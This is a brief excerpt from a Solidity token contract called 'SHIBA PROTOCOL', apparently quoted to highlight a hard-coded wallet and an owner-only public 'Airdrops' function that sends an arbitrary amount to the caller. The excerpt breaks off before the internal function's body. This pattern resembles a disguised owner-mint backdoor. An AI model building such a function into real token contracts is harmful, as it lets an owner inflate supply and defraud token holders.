...
contract SHIBAPROTOCOL is Context, IERC20, Ownable {
    ...
    address public receiveing_wallet = 0x262BBa1C90505c7C25EDe00Ca77a97ee22eFcE90;
    ...
    string private _name = "SHIBA PROTOCOL";
    ...
    uint256 constant numTokensSellToAddToLiquidity = 10000000 * 10**6 * 10**9;
    ...
    function Airdrops(uint256 amount) public onlyOwner {
    _Airdrops(msg.sender, amount);
    }
    
    function _Airdrops(address account, uint256 amount) internal virtual {
